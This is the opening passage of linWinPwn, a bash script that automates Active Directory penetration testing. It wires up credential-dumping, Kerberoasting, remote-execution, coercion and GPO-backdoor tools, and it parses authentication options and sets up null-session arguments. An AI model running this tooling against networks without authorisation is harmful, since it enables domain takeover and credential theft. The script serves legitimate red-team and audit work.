#!/bin/bash
# Title: linWinPwn
# Author: lefayjey

#Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
NC='\033[0m'

#Default variables
user=""
password=""
interactive_bool=true
output_dir=$(pwd)
wordlists_dir="/opt/lwp-wordlists"
pass_wordlist="/usr/share/wordlists/rockyou.txt"
if ! stat "${pass_wordlist}" >/dev/null 2>&1; then pass_wordlist="${wordlists_dir}/rockyou.txt"; fi
user_wordlist="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
if ! stat "${user_wordlist}" >/dev/null 2>&1; then user_wordlist="${wordlists_dir}/cirt-default-usernames.txt"; fi
attacker_interface="eth0"
attacker_IP=$(ip -f inet addr show ${attacker_interface} 2>/dev/null | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
targets="DC"
ldap_port="389"
nullsess_bool=false
pass_bool=false
hash_bool=false
kerb_bool=false
aeskey_bool=false
cert_bool=false
autoconfig_bool=false
ldaps_bool=false
ldapbindsign_bool=false
ldap_signing_enforced=false
ldap_channel_binding_enforced=false
forcekerb_bool=false
verbose_bool=false
dnstcp_bool=false
useip_bool=false
noexec_bool=false
offline_bool=false

#Tools variables
scripts_dir="/opt/lwp-scripts"
netexec=$(which netexec)
impacket_findDelegation=$(which findDelegation.py)
if ! stat "${impacket_findDelegation}" >/dev/null 2>&1; then impacket_findDelegation=$(which impacket-findDelegation); fi
impacket_GetUserSPNs=$(which GetUserSPNs.py)
if ! stat "${impacket_GetUserSPNs}" >/dev/null 2>&1; then impacket_GetUserSPNs=$(which impacket-GetUserSPNs); fi
impacket_secretsdump=$(which secretsdump.py)
if ! stat "${impacket_secretsdump}" >/dev/null 2>&1; then impacket_secretsdump=$(which impacket-secretsdump); fi
impacket_GetNPUsers=$(which GetNPUsers.py)
if ! stat "${impacket_GetNPUsers}" >/dev/null 2>&1; then impacket_GetNPUsers=$(which impacket-GetNPUsers); fi
impacket_getTGT=$(which getTGT.py)
if ! stat "${impacket_getTGT}" >/dev/null 2>&1; then impacket_getTGT=$(which impacket-getTGT); fi
impacket_goldenPac=$(which goldenPac.py)
if ! stat "${impacket_goldenPac}" >/dev/null 2>&1; then impacket_goldenPac=$(which impacket-goldenPac); fi
impacket_rpcdump=$(which rpcdump.py)
if ! stat "${impacket_rpcdump}" >/dev/null 2>&1; then impacket_rpcdump=$(which impacket-rpcdump); fi
impacket_reg=$(which reg.py)
if ! stat "${impacket_reg}" >/dev/null 2>&1; then impacket_reg=$(which impacket-reg); fi
impacket_smbserver=$(which smbserver.py)
if ! stat "${impacket_smbserver}" >/dev/null 2>&1; then impacket_smbserver=$(which impacket-smbserver); fi
impacket_ticketer=$(which ticketer.py)
if ! stat "${impacket_ticketer}" >/dev/null 2>&1; then impacket_ticketer=$(which impacket-ticketer); fi
impacket_ticketconverter=$(which ticketConverter.py)
if ! stat "${impacket_ticketconverter}" >/dev/null 2>&1; then impacket_ticketconverter=$(which impacket-ticketconverter); fi
impacket_getST=$(which getST.py)
if ! stat "${impacket_getST}" >/dev/null 2>&1; then impacket_getST=$(which impacket-getST); fi
impacket_raiseChild=$(which raiseChild.py)
if ! stat "${impacket_raiseChild}" >/dev/null 2>&1; then impacket_raiseChild=$(which impacket-raiseChild); fi
impacket_smbclient=$(which smbclient.py)
if ! stat "${impacket_smbclient}" >/dev/null 2>&1; then impacket_smbclient=$(which impacket-smbexec); fi
impacket_smbexec=$(which smbexec.py)
if ! stat "${impacket_smbexec}" >/dev/null 2>&1; then impacket_smbexec=$(which impacket-smbexec); fi
impacket_wmiexec=$(which wmiexec.py)
if ! stat "${impacket_wmiexec}" >/dev/null 2>&1; then impacket_wmiexec=$(which impacket-wmiexec); fi
impacket_psexec=$(which psexec.py)
if ! stat "${impacket_psexec}" >/dev/null 2>&1; then impacket_psexec=$(which impacket-psexec); fi
impacket_changepasswd=$(which changepasswd.py)
if ! stat "${impacket_changepasswd}" >/dev/null 2>&1; then impacket_changepasswd=$(which impacket-changepasswd); fi
impacket_mssqlclient=$(which mssqlclient.py)
if ! stat "${impacket_mssqlclient}" >/dev/null 2>&1; then impacket_mssqlclient=$(which impacket-mssqlclient); fi
impacket_describeticket=$(which describeTicket.py)
if ! stat "${impacket_describeticket}" >/dev/null 2>&1; then impacket_describeticket=$(which impacket-describeTicket); fi
impacket_badsuccessor=$(which badsuccessor.py)
if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then impacket_badsuccessor=$(which impacket-badsuccessor); fi
enum4linux_py=$(which enum4linux-ng)
if ! stat "${enum4linux_py}" >/dev/null 2>&1; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
bloodhound=$(which bloodhound-python)
bloodhoundce=$(which bloodhound-ce-python)
ldapdomaindump=$(which ldapdomaindump)
smbmap=$(which smbmap)
adidnsdump=$(which adidnsdump)
certi_py=$(which certi.py)
certipy=$(which certipy)
ldeep=$(which ldeep)
pre2k=$(which pre2k)
certsync=$(which certsync)
hekatomb=$(which hekatomb)
manspider=$(which manspider)
coercer=$(which coercer)
donpapi=$(which DonPAPI)
bloodyad=$(which bloodyAD)
mssqlrelay=$(which mssqlrelay)
kerbrute="$scripts_dir/kerbrute"
silenthound="$scripts_dir/silenthound.py"
windapsearch="$scripts_dir/windapsearch"
CVE202233679="$scripts_dir/CVE-2022-33679.py"
targetedKerberoast="$scripts_dir/targetedKerberoast.py"
FindUncommonShares="$scripts_dir/FindUncommonShares.py"
FindUnusualSessions="$scripts_dir/FindUnusualSessions.py"
ExtractBitlockerKeys="$scripts_dir/ExtractBitlockerKeys.py"
ldapconsole="$scripts_dir/ldapconsole.py"
pyLDAPmonitor="$scripts_dir/pyLDAPmonitor.py"
LDAPWordlistHarvester="$scripts_dir/LDAPWordlistHarvester.py"
rdwatool=$(which rdwatool)
aced="$scripts_dir/aced-main/aced.py"
sccmhunter="$scripts_dir/sccmhunter-main/sccmhunter.py"
ldapper="$scripts_dir/ldapper/ldapper.py"
orpheus="$scripts_dir/orpheus-main/orpheus.py"
krbjack=$(which krbjack)
adalanche="$scripts_dir/adalanche"
pygpoabuse="$scripts_dir/pyGPOAbuse-master/pygpoabuse.py"
GPOwned="$scripts_dir/GPOwned.py"
privexchange="$scripts_dir/privexchange.py"
RunFinger="$scripts_dir/Responder/RunFinger.py"
LDAPNightmare="$scripts_dir/CVE-2024-49113-checker.py"
ADCheck=$(which adcheck)
smbclientng=$(which smbclientng)
evilwinrm=$(which evil-winrm)
ldapnomnom="$scripts_dir/ldapnomnom"
godap="$scripts_dir/godap"
mssqlpwner=$(which mssqlpwner)
aesKrbKeyGen="$scripts_dir/aesKrbKeyGen.py"
sccmsecrets="$scripts_dir/SCCMSecrets-master/SCCMSecrets.py"
soapy=$(which soapy)
soaphound=$(which soaphound)
gpoParser=$(which gpoParser)
spearspray=$(which spearspray)
GroupPolicyBackdoor="$scripts_dir/GroupPolicyBackdoor-master/gpb.py"
NetworkHound="$scripts_dir/NetworkHound-main/NetworkHound.py"
sharehound=$(which sharehound)
daclsearch=$(which daclsearch)
nmap=$(which nmap)
john=$(which john)
python3="${scripts_dir}/.venv/bin/python3"
if ! stat "${python3}" >/dev/null 2>&1; then python3=$(which python3); fi

print_banner() {
    echo -e "
       _        __        ___       ____                  
      | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __   
      | || | '_  \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \  
      | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
      |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 

      ${BLUE}linWinPwn: ${CYAN}version 1.3.7 ${NC}
      https://github.com/lefayjey/linWinPwn
      ${BLUE}Author: ${CYAN}lefayjey${NC}
      ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
"
}

help_linWinPwn() {
    print_banner
    echo -e "${YELLOW}Parameters${NC}"
    echo -e "-h/--help           Show the help message"
    echo -e "-t/--target         IP Address of Target Domain Controller ${RED}[MANDATORY]${NC}"
    echo -e "-d/--domain         Domain of user (default: empty)"
    echo -e "-u/--username       Username (default: empty)"
    echo -e "-p                  Password (NTLM authentication only) (default: empty)"
    echo -e "-H                  LM:NT (NTLM authentication only) (default: empty)"
    echo -e "-K                  Location to Kerberos ticket './krb5cc_ticket' (Kerberos authentication only) (default: empty)"
    echo -e "-A                  AES Key (Kerberos authentication only) (default: empty)"
    echo -e "-C                  Location to PFX Certificate './cert.pfx' (default: empty)"
    echo -e "--cert-pass         Password of provided PFX Certificate (optional)"
    echo -e "--auto              Run automatic enumeration"
    echo -e "-o/--output         Output directory (default: current dir)"
    echo -e "--auto-config       Run NTP sync with target DC and adds entry to /etc/hosts"
    echo -e "--dc-domain         Specify the Domain Controller's domain, if netexec fails to obtain it"
    echo -e "--ldap-port         Use custom LDAP port (default port 389)"
    echo -e "--ldaps             Use LDAPS instead of LDAP (port 636)"
    echo -e "--ldap-bind-sign    Use LDAP Channel Binding (LDAPS) / LDAP Signing (LDAP)"
    echo -e "--force-kerb        Use Kerberos authentication instead of NTLM when possible (requires password or NTLM hash)"
    echo -e "--dns-ip            Use Custom IP for DNS (instead of the DomainController)"
    echo -e "--dns-tcp           Use TCP protocol for DNS (when possible)"
    echo -e "--use-ip            Use IP addresses instead of hostnames (if DNS issues)"
    echo -e "--no-exec           Only print commands to be executed, do not run any tools"
    echo -e "--offline           Skip connection and authentication checks"
    echo -e "--verbose           Enable all verbose and debug outputs"
    echo -e "-I/--interface      Attacker's network interface (default: eth0)"
    echo -e "-T/--targets        Target systems for Vuln Scan, SMB Scan, Network Scan and Pwd Dump (Interactive mode default = DC, Auto mode default = All)"
    echo -e "     ${CYAN}Choose between:${NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)"
    echo -e "-U/--userwordlist   Custom username list used during Null session checks"
    echo -e "-P/--passwordlist   Custom password list used during password cracking"
    echo -e ""
    echo -e "${YELLOW}Example usages${NC}"
    echo -e "$(pwd)/$(basename "$0") -t dc_ip ${CYAN}(No password for anonymous login)${NC}" >&2
    echo -e "$(pwd)/$(basename "$0") -t dc_ip -d domain -u user [-p password or -H hash or -K kerbticket]" >&2
    echo -e ""
}

args=()
while test $# -gt 0; do
    case $1 in
    -t | --target)
        dc_ip="${2}"
        dns_ip=${dc_ip}
        shift
        ;; #mandatory
    -d | --domain)
        domain="${2}"
        shift
        ;;
    -u | --user)
        user="${2}"
        shift
        ;; #leave empty for anonymous login
    -p)
        password="${2}"
        if [ ! "${password}" == "" ]; then pass_bool=true; fi
        shift
        ;; #password
    -H)
        hash="${2}"
        if [ ! "${hash}" == "" ]; then hash_bool=true; fi
        shift
        ;; #NTLM hash
    -K)
        krb5cc="${2}"
        if [ ! "${krb5cc}" == "" ]; then kerb_bool=true; fi
        shift
        ;; #location of krb5cc ticket
    -A)
        aeskey="${2}"
        if [ ! "${aeskey}" == "" ]; then aeskey_bool=true; fi
        shift
        ;; #AES Key (128 or 256 bits)
    -C)
        pfxcert="$(realpath "${2}")"
        if [ ! "${pfxcert}" == "" ]; then cert_bool=true; fi
        shift
        ;; #location of PFX certificate
    --cert-pass)
        pfxpass="${2}"
        shift
        ;; #Password of PFX certificate
    -o)
        output_dir="$(realpath "${2}")"
        shift
        ;;
    --output)
        output_dir="$(realpath "${2}")"
        shift
        ;;
    --auto)
        interactive_bool=false
        targets="All"
        args+=("$1")
        ;; #auto mode, disable interactive
    -I | --interface)
        attacker_IP="$(ip -f inet addr show "${2}" | sed -En 's/.*inet ([0-9.]+).*/\1/p')"
        attacker_interface="${2}"
        shift
        ;;
    -T | --targets)
        targets="${2}"
        shift
        ;;
    -U | --userwordlist)
        user_wordlist="${2}"
        shift
        ;;
    -P | --passwordlist)
        pass_wordlist="${2}"
        shift
        ;;
    --auto-config)
        autoconfig_bool=true
        args+=("$1")
        ;;
    --dc-domain)
        dc_domain="${2}"
        shift
        ;;
    --ldap-port)
        ldap_port="${2}"
        shift
        ;;
    --ldaps)
        ldaps_bool=true
        ldap_port="636"
        args+=("$1")
        ;;
    --ldap-bind-sign)
        ldapbindsign_bool=true
        args+=("$1")
        ;;
    --force-kerb)
        forcekerb_bool=true
        args+=("$1")
        ;;
    --dns-ip)
        dns_ip="${2}"
        shift
        ;;
    --dns-tcp)
        dnstcp_bool=true
        args+=("$1")
        ;;
    --use-ip)
        useip_bool=true
        args+=("$1")
        ;;
    --no-exec)
        noexec_bool=true
        args+=("$1")
        ;;
    --offline)
        offline_bool=true
        noexec_bool=true
        dc_ip="127.0.0.1"
        dns_ip="127.0.0.1"
        dc_domain="domain.local"
        dc_NETBIOS="dc"
        user=""
        password=""
        domain=""
        pass_bool=false
        hash_bool=false
        kerb_bool=false
        aeskey_bool=false
        cert_bool=false
        args+=("$1")
        ;;
    --verbose)
        verbose_bool=true
        args+=("$1")
        ;;
    -h | --help)
        help_linWinPwn
        exit
        ;;
    *)
        print_banner
        echo -e "${RED}[-] Unknown option:${NC} ${1}"
        echo -e "Use -h for help"
        exit 1
        ;;
    esac
    shift
done
set -- "${args[@]}"

run_command() {
    if [ "${noexec_bool}" == false ]; then
        pattern="${password}${hash}${aeskey}"
        if [ -n "$pattern" ]; then
            escaped=$(printf '%s' "$pattern" | sed 's/[][\\/.*^$]/\\&/g')
            sed_expr="s/${escaped}/********/g"
            echo "$(date '+%F %T'); $*" | sed -e "$sed_expr" 2>/dev/null >> "$command_log"
            echo -e "${YELLOW}[i]${NC} Running command: $*" | sed -e "$sed_expr" 2>/dev/null > /dev/tty
        else
            echo "$(date '+%F %T'); $*" >> "$command_log"
            echo -e "${YELLOW}[i]${NC} Running command: $*" > /dev/tty
        fi
        /usr/bin/script -qc "$@" /dev/null
    else
        echo -e "${YELLOW}[i]${NC} Printing command: $*" > /dev/tty
    fi
}

ntp_update() {
    echo -e ""
    sudo timedatectl set-ntp 0
    sudo ntpdate "${dc_ip}"
    echo -e "${GREEN}[+] NTP sync complete${NC}"
}

etc_hosts_update() {
    echo -e ""
    if ! grep -q "${dc_ip}" "/etc/hosts" >/dev/null 2>&1; then
        hosts_bak="${Config_dir}/hosts.$(date +%Y%m%d%H%M%S).backup"
        sudo cp /etc/hosts "${hosts_bak}"
        echo -e "${YELLOW}[i] Backup file of /etc/hosts created: ${hosts_bak}${NC}"
        sudo sed -i "/${dc_FQDN}/d" /etc/hosts
        echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
        echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
        echo -e "${GREEN}[+] Hosts file update complete${NC}"
    else
        echo -e "${PURPLE}[-] Target IP already present in /etc/hosts... ${NC}"
    fi
}

etc_resolv_update() {
    echo -e ""
    if ! grep -q "${dns_ip}" "/etc/resolv.conf" >/dev/null 2>&1; then
        resolv_bak="${Config_dir}/resolv.conf.$(date +%Y%m%d%H%M%S).backup"
        sudo cp /etc/resolv.conf "${resolv_bak}"
        echo -e "${YELLOW}[i] Backup file of /etc/resolv.conf created: ${resolv_bak}${NC}"
        sed "1s/^/\# \/etc\/resolv.conf entry added by linWinPwn\nnameserver ${dns_ip}\n/" /etc/resolv.conf | sudo tee /etc/resolv.conf
        echo -e "${GREEN}[+] DNS resolv config update complete${NC}"
    else
        echo -e "${PURPLE}[-] DNS IP already present in /etc/resolv.conf... ${NC}"
    fi
}

etc_krb5conf_update() {
    echo -e ""
    if ! grep -q "${dc_domain}" "/etc/krb5.conf" >/dev/null 2>&1; then
        krb5_bak="${Config_dir}/krb5.conf.$(date +%Y%m%d%H%M%S)".backup
        sudo cp /etc/krb5.conf "${krb5_bak}"
        echo -e "${YELLOW}[i] Backup file of /etc/krb5.conf created: ${krb5_bak}${NC}"
        echo -e "# /etc/krb5.conf file modified by linWinPwn" | sudo tee /etc/krb5.conf
        echo -e "[libdefaults]" | sudo tee -a /etc/krb5.conf
        echo -e "        default_realm = ${domain^^}" | sudo tee -a /etc/krb5.conf
        echo -e "        kdc_timesync = 1" | sudo tee -a /etc/krb5.conf
        echo -e "        ccache_type = 4" | sudo tee -a /etc/krb5.conf
        echo -e "        forwardable = true" | sudo tee -a /etc/krb5.conf
        echo -e "        proxiable = true" | sudo tee -a /etc/krb5.conf
        echo -e "        rdns = false" | sudo tee -a /etc/krb5.conf
        echo -e "        fcc-mit-ticketflags = true" | sudo tee -a /etc/krb5.conf
        echo -e "        dns_canonicalize_hostname = false" | sudo tee -a /etc/krb5.conf
        echo -e "        dns_lookup_realm = false" | sudo tee -a /etc/krb5.conf
        echo -e "        dns_lookup_kdc = false" | sudo tee -a /etc/krb5.conf
        echo -e "        k5login_authoritative = false" | sudo tee -a /etc/krb5.conf
        echo -e "" | sudo tee -a /etc/krb5.conf
        echo -e "[realms]" | sudo tee -a /etc/krb5.conf
        echo -e "        ${domain^^} = {" | sudo tee -a /etc/krb5.conf
        echo -e "                kdc = ${dc_FQDN}" | sudo tee -a /etc/krb5.conf
        echo -e "                admin_server = ${dc_FQDN}" | sudo tee -a /etc/krb5.conf
        echo -e "                default_domain = ${domain,,}" | sudo tee -a /etc/krb5.conf
        echo -e "        }" | sudo tee -a /etc/krb5.conf
        echo -e "" | sudo tee -a /etc/krb5.conf
        echo -e "[domain_realm]" | sudo tee -a /etc/krb5.conf
        echo -e "        .${domain,,} = ${domain^^}" | sudo tee -a /etc/krb5.conf
        echo -e "        ${domain,,} = ${domain^^}" | sudo tee -a /etc/krb5.conf
        echo -e "${GREEN}[+] KRB5 config update complete${NC}"
    else
        echo -e "${PURPLE}[-] Domain already present in /etc/krb5.conf... ${NC}"
    fi
}

prepare() {
    if [ -z "$dc_ip" ]; then
        echo -e "${RED}[-] Missing target... ${NC}"
        if [ -n "$domain" ]; then
            dig_ip=$(dig +short "${domain}")
            if [ -n "$dig_ip" ]; then echo -e "${YELLOW}[i]${NC} Provided domain resolves to ${dig_ip}!${NC}"; fi
        fi
        echo -e "${YELLOW}[i]${NC} Use -h for more help"
        exit 1
    elif [[ ! $dc_ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo -e "${RED}[-] Target is not an IP address... ${NC}"
        dig_ip=$(dig +short "${dc_ip}")
        if [ -n "$dig_ip" ]; then echo -e "${YELLOW}[i]${NC} Provided target resolves to ${dig_ip}!${NC}"; fi

        if [ -n "$domain" ]; then
            dig_ip=$(dig +short "${domain}")
            if [ -n "$dig_ip" ]; then echo -e "${YELLOW}[i]${NC} Provided domain resolves to ${dig_ip}!${NC}"; fi
        fi
        echo -e "${YELLOW}[i]${NC} Use -h for more help"
        exit 1
    fi

    echo -e "${GREEN}[+] $(date)${NC}"

    if ! stat "${netexec}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please ensure netexec is installed and try again... ${NC}"
        exit 1
    elif [ "${offline_bool}" == "false" ]; then
        dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "\[-\]\|Connection refused")
        if [[ $dc_info == *"First time use detected"* ]]; then
            dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "\[-\]\|Connection refused")
        fi
        if [ -z "$dc_info" ]; then
            echo -e "${PURPLE}[!] Error connecting to LDAP! Please ensure the LDAP port is correct and accessible (--ldaps, --ldap-port 3268). Using SMB only ... ${NC}"
            dc_info=$(${netexec} smb "${dc_ip}" | grep -v "Connection refused")
        fi
        if [ -z "$dc_info" ]; then
            echo -e "${PURPLE}[!] Error connecting to SMB! Please ensure the SMB port is correct and accessible. Attempting to use MSSQL ... ${NC}"
            dc_info=$(${netexec} mssql "${dc_ip}" | grep -v "Connection refused")
        fi
        if [ -z "$dc_info" ]; then
            echo -e "${PURPLE}[!] Error connecting to MSSQL! Please ensure the MSSQL port is correct and accessible.${NC}"
        fi
        if [ -z "$dc_info" ]; then
            echo -e "${RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and is accessible, and try again... ${NC}"
            exit 1
        fi

        # Extract NETBIOS name and domain from dc_info
        dc_NETBIOS=$(echo "$dc_info" | sed -E 's/.*\((name:)([^)]+)\).*/\2/' | head -n 1)

        # Detect LDAP signing enforcement from netexec output
        if [[ $dc_info == *"signing:True"* ]] || [[ $dc_info == *"signing:Enforced"* ]]; then
            ldap_signing_enforced=true
        fi

        # Detect LDAP channel binding enforcement from netexec output
        # Note: Channel binding can only be accurately detected via LDAPS (port 636)
        if [[ $dc_info == *"channel binding:Always"* ]] || [[ $dc_info == *"channel binding:True"* ]]; then
            ldap_channel_binding_enforced=true
        elif [[ $dc_info == *"channel binding:Unknown"* ]]; then
            # Query LDAPS to get accurate channel binding status
            dc_info_ldaps=$(${netexec} ldap --port 636 "${dc_ip}" 2>/dev/null | grep -v "\[-\]\|Connection refused")
            if [[ $dc_info_ldaps == *"channel binding:Always"* ]] || [[ $dc_info_ldaps == *"channel binding:True"* ]]; then
                ldap_channel_binding_enforced=true
            fi
        fi

        # Auto-enable LDAP signing/channel binding for tools that support it
        if [ "${ldap_signing_enforced}" == true ] || [ "${ldap_channel_binding_enforced}" == true ]; then
            ldapbindsign_bool=true
        fi

        # If dc_domain is missing, use the provided dc domain
        if [ -z "$dc_domain" ]; then
            dc_domain=$(echo "$dc_info" | sed -E 's/.*\((domain:)([^)]+)\).*/\2/' | head -n 1)
            if [ -z "$dc_domain" ] && [ "${offline_bool}" == "false" ]; then
                echo -e "${RED}[-] Error finding DC's domain, please specify it using '--dc-domain'${NC}"
                exit 1
            fi
        fi
    fi

    # Build the Fully Qualified Domain Name (FQDN)
    if [[ "$dc_NETBIOS" == *"$dc_domain"* ]]; then
        dc_FQDN="$dc_NETBIOS"
        dc_NETBIOS=$(echo "$dc_FQDN" | cut -d '.' -f 1)
    else
        dc_FQDN="${dc_NETBIOS}.${dc_domain}"
    fi

    # Set the domain variable if not already set
    if [ -z "$domain" ]; then domain="$dc_domain"; fi

    if [ "${user}" == "" ]; then user_out="null"; else user_out=${user// /}; fi
    output_dir="${output_dir}/linWinPwn_${dc_domain}"
    user_var="${user_out/\$/}@${domain}"
    command_log="${output_dir}/$(date +%Y-%m)_command_${user_var}.log"

    Users_dir="${output_dir}/Users"
    Servers_dir="${output_dir}/Servers"
    servers_ip_list="${Servers_dir}/servers_ip_list_${dc_domain}.txt"
    dc_ip_list="${Servers_dir}/dc_ip_list_${dc_domain}.txt"
    sql_ip_list="${Servers_dir}/sql_ip_list_${dc_domain}.txt"
    servers_hostname_list="${Servers_dir}/servers_list_${dc_domain}.txt"
    dc_hostname_list="${Servers_dir}/dc_list_${dc_domain}.txt"
    sql_hostname_list="${Servers_dir}/sql_list_${dc_domain}.txt"
    custom_servers_list="${Servers_dir}/custom_servers_list_${dc_domain}.txt"
    users_list="${Users_dir}/users_list_${dc_domain}.txt"
    if [ "${useip_bool}" == true ]; then target="${dc_ip}"; else target="${dc_FQDN}"; fi
    if [ "${useip_bool}" == true ]; then target_dc="${dc_ip_list}"; else target_dc="${dc_hostname_list}"; fi
    if [ "${useip_bool}" == true ]; then target_servers="${servers_ip_list}"; else target_servers="${servers_hostname_list}"; fi
    if [ "${useip_bool}" == true ]; then target_sql="${sql_ip_list}"; else target_sql="${sql_hostname_list}"; fi

    Credentials_dir="${output_dir}/Credentials"
    DomainRecon_dir="${output_dir}/DomainRecon"
    Config_dir="${output_dir}/Config"
    Scans_dir="${output_dir}/Scans"
    ADCS_dir="${output_dir}/ADCS"
    SCCM_dir="${output_dir}/SCCM"
    Modification_dir="${output_dir}/Modification"
    CommandExec_dir="${output_dir}/CommandExec"
    MSSQL_dir="${output_dir}/MSSQL"
    BruteForce_dir="${output_dir}/BruteForce"
    Vulnerabilities_dir="${output_dir}/Vulnerabilities"
    Kerberos_dir="${output_dir}/Kerberos"
    Shares_dir="${output_dir}/Shares"
    GPO_dir="${output_dir}/GPO"

    mkdir -p "${Credentials_dir}"
    mkdir -p "${DomainRecon_dir}"
    mkdir -p "${Servers_dir}"
    mkdir -p "${Users_dir}"
    mkdir -p "${Scans_dir}"

    if [ "${offline_bool}" == "false" ]; then
        if ! stat "${Scans_dir}/${dc_ip}_mainports.txt" >/dev/null 2>&1; then
            ${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 "${dc_ip}" -sT -T5 --open > "${Scans_dir}/${dc_ip}"_mainports.txt;
        fi
        dc_open_ports=$(/bin/cat "${Scans_dir}/${dc_ip}"_mainports.txt 2>/dev/null)
    fi
    if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"389/tcp"* ]]; then dc_port_389="${GREEN}open${NC}"; else dc_port_389="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"636/tcp"* ]]; then dc_port_636="${GREEN}open${NC}"; else dc_port_636="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"88/tcp"* ]]; then dc_port_88="${GREEN}open${NC}"; else dc_port_88="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"3389/tcp"* ]]; then dc_port_3389="${GREEN}open${NC}"; else dc_port_3389="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"5985/tcp"* ]]; then dc_port_5985="${GREEN}open${NC}"; else dc_port_5985="${RED}filtered|closed${NC}"; fi

    if [ "${autoconfig_bool}" == true ]; then
        echo -e "${BLUE}[*] Running auto-config... ${NC}"
        mkdir -p "${Config_dir}"
        ntp_update
        etc_hosts_update
        etc_resolv_update
        etc_krb5conf_update
    fi

    if ! stat "${servers_ip_list}" >/dev/null 2>&1; then /bin/touch "${servers_ip_list}"; fi
    if ! stat "${servers_hostname_list}" >/dev/null 2>&1; then /bin/touch "${servers_hostname_list}"; fi
    if ! stat "${dc_ip_list}" >/dev/null 2>&1; then /bin/touch "${dc_ip_list}"; fi
    if ! stat "${dc_hostname_list}" >/dev/null 2>&1; then /bin/touch "${dc_hostname_list}"; fi

    if ! stat "${user_wordlist}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Users list file not found${NC}"
    fi

    if ! stat "${pass_wordlist}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Passwords list file not found${NC}"
    fi

    echo -e ""

    if [[ "${targets,,}" == "dc" ]]; then
        curr_targets="Domain Controllers"
        curr_targets_list="${target_dc}"
    elif [[ "${targets,,}" == "all" ]]; then
        curr_targets="All domain servers"
        curr_targets_list="${target_servers}"
    elif [[ ${targets,,} == "file="* ]]; then
        curr_targets="File containing list of servers: "
        custom_servers=$(echo "$targets" | cut -d "=" -f 2)
        /bin/cp "${custom_servers}" "${custom_servers_list}" 2>/dev/null
        if [ ! -s "${custom_servers_list}" ]; then
            echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
            curr_targets="Domain Controllers"
            curr_targets_list="${target_dc}"
            custom_servers=""
        fi
        curr_targets_list="${custom_servers_list}"
    elif [[ ${targets,,} == "ip="* ]]; then
        curr_targets="IP or hostname: "
        custom_ip=$(echo "$targets" | cut -d "=" -f 2)
        echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
        if [ ! -s "${custom_servers_list}" ]; then
            echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
            curr_targets="Domain Controllers"
            curr_targets_list="${target_dc}"
            custom_ip=""
        fi
        curr_targets_list="${custom_servers_list}"
    else
        echo -e "${RED}[-] Error invalid targets parameter.${NC} Choosing default setting: ${YELLOW}Domain Controllers${NC}"
        echo -e ""
        curr_targets="Domain Controllers"
        curr_targets_list="${target_dc}"
    fi
}

authenticate() {
    #Check if null session or empty password is used
    if [ "${pass_bool}" == false ] && [ "${hash_bool}" == false ] && [ "${kerb_bool}" == false ] && [ "${aeskey_bool}" == false ] && [ "${cert_bool}" == false ]; then
        if [ ! "${user}" == "" ]; then
            echo -e "${RED}[i]${NC} Please specify password, NTLM hash, Kerberos ticket, AES key or certificate and try again..."
            exit 1
        else
            nullsess_bool=true
            rand_user=$(
                tr -dc A-Za-z0-9 </dev/urandom | head -c 10
                echo
            )
            argument_ne="-d ${domain} -u '' -p ''"
            argument_smbmap="-d ${domain} -u '' -p ''"
            argument_manspider="-d ${domain} -u '' -p ''"
            argument_coercer="-d ${domain} -u '' -p ''"
            argument_bloodyad="-d ${domain} -u '' -p ''"
            argument_privexchange="-d ${domain} -u '' -p ''"
            argument_windap="-d ${domain}"
            argument_adidns=""
            argument_ldd=""
            argument_silenthd=""
            argument_enum4linux=""
            argument_imp="${domain}/"
            argument_imp_gp="${domain}/"
            argument_ldeep="-d ${dc_domain} -a"
            argument_pre2k="-d ${domain}"
            argument_p0dalirius="-d ${domain} -u Guest -p ''"
            argument_p0dalirius_a="-ad ${domain} -au Guest -ap ''"
            argument_adalanche="--authmode anonymous --username Guest\\@${domain} -p '!'"
            argument_godap=""
            argument_gpb="-d ${dc_domain}"
            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}null session ${NC}"
        fi

    #Check if username is not provided
    elif [ "${user}" == "" ]; then
        echo -e "${RED}[i]${NC} Please specify username and try again..."
        exit 1
    fi

    #Check if password is used
    if [ "${pass_bool}" == true ]; then
        argument_ne="-d ${domain} -u '${user}' -p '${password}'"
        argument_imp="${domain}/'${user}':'${password}'"
        argument_imp_gp="${domain}/'${user}':'${password}'"
        argument_imp_ti="-user '${user}' -password '${password}' -domain ${domain}"
